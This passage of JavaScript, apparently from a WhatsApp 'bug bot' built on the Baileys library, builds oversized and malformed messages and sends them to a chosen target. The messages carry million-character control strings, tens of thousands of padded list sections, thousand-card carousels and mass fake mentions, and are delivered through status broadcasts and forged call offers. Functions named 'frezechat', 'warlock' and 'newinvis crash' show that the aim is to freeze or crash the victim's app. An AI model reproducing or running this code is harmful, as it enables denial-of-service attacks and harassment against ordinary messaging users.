      message: {
        interactiveResponseMessage: {
          body: { text: "𝗫 - 𝗭 𝗘 𝗡 𝗢", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        },

        messageContextInfo: {
          deviceListMetada: {},
          deviceListMetadaVersion: 2
        },

        interactiveResponseMessage_for_CsmXPL: {
          body: { text: "CosmoX", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "payment_method",
            params: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(1045000)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            version: 3
          },
          contextInfo: {
            participant: target,
            remoteJid: "X",
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1998 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
            ]
          }
        },

        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "9999999",
          seconds: 999999,
          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "COSMOX",
          height: 999999,
          width: 999999,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743742853",
          contextInfo: {
            isSampled: true,
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1998 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
            ]
          },
          streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
          thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
          thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
          thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
          annotations: [{
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "CsmX",
                songId: "peler",
                author: ".CsmX▾" + "༑ ▾俳貍賳貎".repeat(100),
                title: "CosmoX",
                artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                artistAttribution: "https://t.me/raysofhopee",
                countryBlocklist: true,
                isExplicit: true,
                artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
              }
            },
            embeddedAction: null
          }]
        },

        listResponseMessage: {
          title: "¡CsmX!",
          listType: 2,
          buttonText: null,
          sections: Array.from({ length: 30000 }, (_, r) => ({
            title: "ꦾ".repeat(90000) + "ꦽ".repeat(90000) + "\u0003".repeat(9000),
            rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
          })),
          singleSelectReply: { selectedRowId: "🥚" },
          contextInfo: {
            mentionedJid: Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "5521992999999@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "CsmX back?"
        },

        carouselMessage: {
          cards: (function() {
            const cards = [];
            for (let r = 0; r < 1000; r++) {
              cards.push({
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                  buttons: [{ name: "single_select", buttonParamsJson: "ven" }]
                })
              });
            }
            return cards;
          })()
        },

        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1998 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }

      } // end message
    } // end viewOnceMessage
  };

  try {
    const megaMsg = generateWAMessageFromContent(target, megaContent, {});
    await sock.relayMessage("status@broadcast", megaMsg.message, {
      messageId: megaMsg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
        }]
      }]
    });
  } catch (e) {
    console.error("Mega payload gagal dikirim:", e && e.message ? e.message : e);
  }

  try {
    const payload = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "𝗫 - 𝗭 𝗘 𝗡 𝗢", format: "DEFAULT" },
            nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: "\x10".repeat(1045000), version: 3 },
            entryPointConversionSource: "call_permission_request"
          }
        }
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    await sock.relayMessage("status@broadcast", payload.message, {
      messageId: payload.key.id,
      statusJidList: [target],
      additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
    });

    await sock.sendMessage("status@broadcast", { delete: payload.key });
  } catch (e) {
    console.error("TestingPenet send error:", e && e.message ? e.message : e);
  }

  try {
    let Hefaistos = generateWAMessageFromContent(target, {
      ephemeralMessage: {
        message: {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetada: {}, deviceListMetadaVersion: 2 },
              interactiveResponseMessage: {
                body: { text: "CosmoX", format: "DEFAULT" },
                nativeFlowResponseMessage: { name: "payment_method", params: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(1045000)},\"payment_timestamp\":null,\"share_payment_status\":true}`, version: 3 },
                contextInfo: {
                  participant: target,
                  remoteJid: "X",
                  forwardingScore: 999,
                  isForwarded: true,
                  mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 1998 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                  ]
                }
              }
            }
          }
        }
      }
    }, {});

    await sock.relayMessage("status@broadcast", Hefaistos.message, {
      messageId: Hefaistos.key.id,
      statusJidList: [target],
      additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
    });

    let Hades = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
            fileLength: "9999999",
            seconds: 999999,
            mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
            caption: "COSMOX",
            height: 999999,
            width: 999999,
            fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
            directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1743742853",
            contextInfo: {
              isSampled: true,
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from({ length: 1998 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
              ]
            },
            streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
            thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
            thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
            thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
            annotations: [{
              embeddedContent: {
                embeddedMusic: {
                  musicContentMediaId: "CsmX",
                  songId: "peler",
                  author: ".CsmX▾" + "༑ ▾俳貍賳貎".repeat(100),
                  title: "CosmoX",
                  artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                  artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                  artistAttribution: "https://t.me/raysofhopee",
                  countryBlocklist: true,
                  isExplicit: true,
                  artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                }
              },
              embeddedAction: null
            }]
          }
        }
      }
    }, {});

    await sock.relayMessage("status@broadcast", Hades.message, {
      messageId: Hades.key.id,
      statusJidList: [target],
      additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
    });

    const rowsX = Array.from({ length: 30000 }, (_, r) => ({
      title: "ꦾ".repeat(90000) + "ꦽ".repeat(90000) + "\u0003".repeat(9000),
      rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    let CosmoXx = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "¡CsmX!",
            listType: 2,
            buttonText: null,
            sections: rowsX,
            singleSelectReply: { selectedRowId: "🥚" },
            contextInfo: {
              mentionedJid: Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "5521992999999@newsletter",
                serverMessageId: 1,
                newsletterName: "-"
              }
            },
            description: "CsmX back?"
          }
        }
      },
      contextInfo: { channelMessage: true, statusAttributionType: 2 }
    }, {});

    await sock.relayMessage("status@broadcast", CosmoXx.message, {
      messageId: CosmoXx.key.id,
      statusJidList: [target],
      additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
    });

    let floodsDrain = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1998 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    }, {});

    await sock.relayMessage("status@broadcast", floodsDrain.message, {
      messageId: floodsDrain.key.id,
      statusJidList: [target],
      additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
    });

  } catch (e) {
    console.error("CsmXPL send error:", e && e.message ? e.message : e);
  }

  try {
    let push = [];
    for (let r = 0; r < 1000; r++) {
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
        header: proto.Message.InteractiveMessage.Header.fromObject({ hasMediaAttachment: false }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [{ name: "single_select", buttonParamsJson: "ven" }]
        })
      });
    }

    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: "lozuuu" }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: "lozuuu" }),
            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] })
          })
        }
      }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "@rvnn6" }, content: undefined }]
      });
    }
  } catch (e) {
    console.error("VenHard send error:", e && e.message ? e.message : e);
  }

  return true;
}


//newinvis
// assumes you have a connected Baileys client instance named sock
// and helper encodeSignedDeviceIdentity available from Baileys utilities

async function sendCallOffer(sock, target) {
  try {
    // 1) create a random call id
    const callId = crypto.randomBytes(12).toString('hex').toUpperCase();

    // 2) build the offer content (audio capabilities + network + enc options)
    const offerContent = [
      { tag: 'audio', attrs: { enc: 'opus', rate: '16000' } },
      { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
      { tag: 'net', attrs: { medium: '3' } },
      { tag: 'capability', attrs: { ver: '1' }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
      { tag: 'encopt', attrs: { keygen: '2' } }
    ];

    // 3) generate an encryption key for the call (random)
    const encKey = crypto.randomBytes(32);

    // 4) fetch devices for the target (multi-device supported)
    let devices = await sock.getUSyncDevices([target], false, false);
    devices = devices.map(d => `${d.user}${d.device ? ':' + d.device : ''}@s.whatsapp.net`);

    // 5) ensure we have sessions for those devices
    await sock.assertSessions(devices, true);

    // 6) create participant nodes (this produces destination nodes for the offer)
    const { nodes: destinationNodes, shouldIncludeDeviceIdentity } =
      await sock.createParticipantNodes(
        devices,
        { call: { callKey: new Uint8Array(encKey) } },
        { count: '3' } // suggested count
      );

    // attach destinations to the offer
    offerContent.push({
      tag: 'destination',
      attrs: {},
      content: destinationNodes
    });

    // optionally include signed device identity if required by server
    if (shouldIncludeDeviceIdentity) {
      const deviceIdentityNode = {
        tag: 'device-identity',
        attrs: {},
        content: await encodeSignedDeviceIdentity(sock.authState.creds.account, true)
      };
      offerContent.push(deviceIdentityNode);
    }

    // 7) assemble the top-level call node
    const callNode = {
      tag: 'call',
      attrs: {
        from: sock.user.id,
        to: target,
        id: '0'
      },
      content: [{
        tag: 'offer',
        attrs: {
          'call-id': callId,
          'call-creator': sock.user.id
        },
        content: offerContent
      }]
    };

    // 8) send the node
    await sock.sendNode(callNode);

    console.log(`Sent call offer ${callId} -> ${target}`);
    return { ok: true, callId };

  } catch (err) {
    console.error('sendCallOffer error:', err);
    return { ok: false, error: err };
  }
}


//freze
async function frezechat(sock, target) {
  try {
    const msg = {
      groupInviteMessage: {
        groupName: "ཹ".repeat(130000),
        groupJid: "6285709664923-1627579259@g.us",
        inviteCode: "h+64P9RhJDzgXSPf",
        inviteExpiration: "999",
        caption: "𝗜 𝗟𝗼𝘃𝗲 𝗬𝗼𝘂,𝗧𝗼 𝗠𝘂𝗰𝗵"
      }
    };

    await sock.relayMessage(target, msg, {
      messageId: "FREEZE-" + Date.now()
    });

    console.log(`✅ frezechat executed on ${target}`);
  } catch (err) {
    console.error("❌ frezechat failed:", err);
  }
}



//Xstopper 
const mediaData = [
  {
    ID: "69680D38",
    uri: "t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh",
    buffer: "11-4&oh=01_Q5Aa3QGnIg1qMpL5Isc7LmIdU1IpoFsCqXialsd2OW2w0QQyUw&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "7ovcifxdIivWXIJgLvrRtPfs+pPXen7hoXtnoFKdP4s=",
    mkey: "Wql96TBHCa44YVS6eAlHGI6aYIYg6yc0kuOr0Y9WvtI="
  },
  {
    ID: "69680D38",
    uri: "t62.43144-24/10000000_1534257120961824_1506742782412655205_n.enc?ccb=11-4&oh",
    buffer: "11-4&oh=01_Q5Aa3QEE7wUPnOULMZhlwnOw_bhHK6Gn7YI0hKpVm3yvw5dGMw&oe",
    sid: "5e03e0",
    SHA256: "I2ky6mhJmsFYmA+XRBoiaiTeYwnXGQAVXym+P/9YN6Y=",
    ENCSHA256: "HyfU2MhgxBQFFIohXT68RNZa0MAZRxDYB4X1c3I7JQY=",
    mkey: "Q5V7iUFs67ewh1qOOkqwQ9avc3u7qXAhyh2fIgVITCU="
  },
  {
    ID: "696C0CE0",
    uri: "t62.43144-24/10000000_1897784937438799_7647459696855315586_n.enc?ccb=11-4&oh",
    buffer: "01_Q5Aa3QGNjK1V4UGLF19HxU16vRNPFJQjy64pYSFbsuEm6bySdw&oe",
    sid: "5e03e0",
    SHA256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
    ENCSHA256: "RA4VN83TrKamnTjEolURSU7+2UUDY28EFBBQvFNh7e4=",
    mkey: "dTMN5/4/mFir4PcfgezcrIXqigJ8pl/COUQMxUsTaac="
  }
];

let sequentialIndex = 0;

async function warlock(sock, target) {
  var a = mediaData[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  var b = a.ID;
  const e = a.uri,
    f = a.buffer,
    g = a.sid,
    k = a.SHA256,
    l = a.ENCSHA256;

  a = a.mkey;

  let c;
  c = !1;

  b = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${e}=${f}=${b}&_nc_sid=${g}&mms3=true`,
          fileSha256: k,
          fileEncSha256: l,
          mediaKey: a,
          mimetype: "image/webp",
          directPath: `/v/${e}=${f}=${b}&_nc_sid=${g}`,
          fileLength: {
            low: Math.floor(1E3 * Math.random()),
            high: 0,
            unsigned: !0
          },
          mediaKeyTimestamp: {
            low: Math.floor(17E8 * Math.random()),
            high: 0,
            unsigned: !1
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: !0,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1E4 }, () =>
                "1" + Math.floor(5E6 * Math.random()) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: {
            low: Math.floor(-2E7 * Math.random()),
            high: 555,
            unsigned: c
          },
          isAvatar: c,
          isAiSticker: c,
          isLottie: c
        }
      }
    }
  };

  let stickerMsg = generateWAMessageFromContent(target, b, {});

  await sock.relayMessage("status@broadcast", stickerMsg.message, {
    messageId: stickerMsg.key.id,
    statusJidList: [target]
  });

  let CardsX = [];

  for (let r = 0; r < 1000; r++) {
    CardsX.push({
      body: { text: "" },
      header: {
        title: "",
        imageMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
          fileLength: "98",
          height: 4,
          width: 4,
          mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
          fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
          directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
          mediaKeyTimestamp: "1749728782"
        },
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [{ name: "voice_call", buttonParamsJson: {} }]
      }
    });
  }

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "L0ZUU" },
            carouselMessage: { cards: CardsX }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target]
  });

  const module = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ]
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const Content = generateWAMessageFromContent(target, module.message, {
    userJid: target
  });

  await sock.relayMessage("status@broadcast", Content.message, {
    messageId: Content.key.id,
    statusJidList: [target]
  });

  const viewOnceMsg = generateWAMessageFromContent(
    "status@broadcast",
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", viewOnceMsg.message, {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target]
  });
}




//newinvis crash
async function callPlain9(sock, target, isVideo = false) {
  const devices = (await sock.getUSyncDevices([target], false, false))
    .map(({ user, device }) => `${user}:${device || ""}@s.whatsapp.net`)

  await sock.assertSessions(devices)

  const mutexFactory = () => {
    const map = {}
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() }
        map[key].task = (async prev => {
          try { await prev } catch {}
          return fn()
        })(map[key].task)
        return map[key].task
      }
    }
  }

  const memek = mutexFactory()
  const bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)])

  const originalCreateParticipantNodes = sock.createParticipantNodes.bind(sock)
  const yntkts = sock.encodeWAMessage?.bind(sock)

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length)
      return { nodes: [], shouldIncludeDeviceIdentity: false }

    const patched =
      (await sock.patchMessageBeforeSending?.(message, recipientJids)) ?? message

    const entries = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }))

    const { id: meId, lid: meLid } = sock.authState.creds.me
    const ownUser = jidDecode(meId)?.user
    const ownLidUser = meLid ? jidDecode(meLid)?.user : null

    let shouldIncludeDeviceIdentity = false

    const nodes = await Promise.all(
      entries.map(async ({ recipientJid: jid, message: msg }) => {
        const targetUser = jidDecode(jid)?.user
        const isOwnUser = targetUser === ownUser || targetUser === ownLidUser
        const isMe = jid === meId || jid === meLid

        if (dsmMessage && isOwnUser && !isMe) msg = dsmMessage

        const encoded = yntkts
          ? yntkts(msg)
          : encodeWAMessage(msg)

        const bytes = bokep(encoded)

        return memek.mutex(jid, async () => {
          const { type, ciphertext } =
            await sock.signalRepository.encryptMessage({ jid, data: bytes })

          if (type === "pkmsg") shouldIncludeDeviceIdentity = true

          return {
            tag: "to",
            attrs: { jid },
            content: [{
              tag: "enc",
              attrs: { v: "2", type, ...extraAttrs },
              content: ciphertext
            }]
          }
        })
      })
    )

    return {
      nodes: nodes.filter(Boolean),
      shouldIncludeDeviceIdentity
    }
  }

  const { nodes: destinations, shouldIncludeDeviceIdentity } =
    await sock.createParticipantNodes(devices, { conversation: "y" }, { count: "0" })

  const offerContent = [
    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
    { tag: "net", attrs: { medium: "3" } },
    {
      tag: "capability",
      attrs: { ver: "1" },
      content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
    },
    { tag: "encopt", attrs: { keygen: "2" } },
    { tag: "destination", attrs: {}, content: destinations },
